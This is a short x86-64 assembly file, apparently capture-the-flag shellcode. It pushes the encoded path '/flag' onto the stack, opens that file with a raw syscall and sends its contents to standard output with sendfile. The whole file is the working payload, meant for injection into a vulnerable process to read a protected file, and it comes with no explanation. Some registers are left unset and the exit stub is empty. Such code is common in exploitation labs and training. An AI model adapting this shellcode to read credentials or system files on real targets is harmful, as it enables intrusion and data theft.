        .intel_syntax noprefix
        .global _start
        .text

_start:
open:
        // open 
mov ax,2

        //const char __user * filename
        mov r10, 0x67616c66
        shl r10, 32
        add r10, 0x2faaaaaa
        shr     r10, 24
        push    r10
        mov rdi, rsp
        // int flags
        // umode_t mode
        syscall

        push rax

sendfile:
        // size_t count
        mov     r10, 123456789
        // loff_t__user * offset
        // int in_fd
        pop     rsi
        // int out_fd
        //xor     rdi, rdi
	mov rdi, 1
        //inc rdi
        mov     al, 40
        syscall

exit:   //exit

